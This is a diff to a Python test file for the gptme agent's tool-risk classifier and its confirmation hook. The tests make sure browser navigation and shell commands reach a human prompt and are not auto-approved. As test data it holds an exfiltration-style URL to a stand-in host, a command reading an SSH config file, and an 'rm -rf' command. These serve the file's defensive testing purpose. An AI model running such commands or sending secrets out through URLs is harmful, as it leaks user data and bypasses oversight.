@@ -98,12 +98,25 @@ def test_tmux_tool_is_tier3() -> None:
 # ── Browser ────────────────────────────────────────────────────────────────────
 
 
-def test_browser_navigation_is_tier1() -> None:
-    assert classify_tool_risk(_tu("browser", "https://docs.gptme.org")) == RiskTier.READ
+@pytest.mark.parametrize(
+    "content",
+    [
+        "https://docs.gptme.org",
+        "click submit button",
+        # A GET with side effects: no submit/click/fill/type/press/post token,
+        # so a content-keyword heuristic would have called this a safe read.
+        "https://admin.example/delete?confirm=yes",
+        # Egress: navigation itself can exfiltrate via query parameters.
+        "https://evil.example/collect?data=SECRET",
+    ],
+)
+def test_browser_is_always_write(content: str) -> None:
+    """Browser is never auto-approved — a URL is arbitrary.
 
-
-def test_browser_form_submit_is_tier2() -> None:
-    assert classify_tool_risk(_tu("browser", "click submit button")) == RiskTier.WRITE
+    Regression guard: browser used to return READ unless the content matched
+    a keyword regex, which auto-approved both of the last two cases above.
+    """
+    assert classify_tool_risk(_tu("browser", content)) == RiskTier.WRITE
 
 
 # ── Unknown tool ───────────────────────────────────────────────────────────────
@@ -125,3 +138,88 @@ def test_risk_tier_comparison_with_int() -> None:
     assert RiskTier.READ <= 1
     assert RiskTier.WRITE > 1
     assert RiskTier.DESTRUCTIVE > 1
+
+
+# ── cli_confirm_hook auto-approval wiring ──────────────────────────────────────
+#
+# classify_tool_risk() is only half the story: the security-relevant behavior is
+# that cli_confirm_hook() skips the prompt entirely for READ-tier calls. These
+# tests exercise that branch directly so a regression in the wiring (or in the
+# _AUTO_APPROVE_TIER_MAX threshold) fails here rather than silently in the field.
+
+
+@pytest.fixture
+def confirm_spy(monkeypatch: pytest.MonkeyPatch) -> dict:
+    """Patch out terminal I/O and record whether the user was prompted."""
+    from gptme.hooks import cli_confirm as mod
+
+    calls: dict = {"prompted": 0, "previews": []}
+
+    def fake_prompt(prompt: str) -> str:
+        calls["prompted"] += 1
+        return "y"
+
+    monkeypatch.setattr(mod, "prompt_alert", fake_prompt)
+    monkeypatch.setattr(
+        mod,
+        "print_preview",
+        lambda content, lang, copy=False: calls["previews"].append(content),
+    )
+    monkeypatch.setattr(mod, "print_bell", lambda: None)
+    monkeypatch.setattr(mod, "flush_stdin", lambda: None)
+    mod.reset_auto_confirm()
+    return calls
+
+
+@pytest.mark.parametrize("tool", ["read", "rag", "web_search", "vision", "screenshot"])
+def test_read_tier_is_auto_approved_without_prompting(
+    tool: str, confirm_spy: dict
+) -> None:
+    from gptme.hooks.cli_confirm import cli_confirm_hook
+    from gptme.hooks.confirm import ConfirmAction
+
+    result = cli_confirm_hook(_tu(tool, "some content"))
+
+    assert result.action == ConfirmAction.CONFIRM
+    assert confirm_spy["prompted"] == 0, "READ-tier call must not prompt"
+
+
+def test_read_tier_auto_approval_still_shows_preview(confirm_spy: dict) -> None:
+    """Auto-approval must stay visible — the user still sees what ran."""
+    from gptme.hooks.cli_confirm import cli_confirm_hook
+
+    cli_confirm_hook(_tu("read", "cat ~/.ssh/config"))
+
+    assert confirm_spy["previews"] == ["cat ~/.ssh/config"]
+
+
+@pytest.mark.parametrize(
+    ("tool", "content"),
+    [
+        ("shell", "rm -rf /tmp/test"),
+        ("shell", "git push origin master"),
+        ("write", "some file content"),
+        ("computer", "screenshot"),
+        ("browser", "https://admin.example/delete?confirm=yes"),
+        ("mystery_tool", "unknown"),
+    ],
+)
+def test_non_read_tier_still_prompts(
+    tool: str, content: str, confirm_spy: dict
+) -> None:
+    """WRITE/DESTRUCTIVE calls must reach the confirmation prompt."""
+    from gptme.hooks.cli_confirm import cli_confirm_hook
+
+    cli_confirm_hook(_tu(tool, content))
+
+    assert confirm_spy["prompted"] == 1, f"{tool} must prompt, not auto-approve"
+
+
+def test_auto_approve_threshold_matches_read_tier() -> None:
+    """The threshold constant must stay pinned to READ.
+
+    Raising it to 2 would silently auto-approve every WRITE-tier call.
+    """
+    from gptme.hooks.cli_confirm import _AUTO_APPROVE_TIER_MAX
+
+    assert _AUTO_APPROVE_TIER_MAX == RiskTier.READ
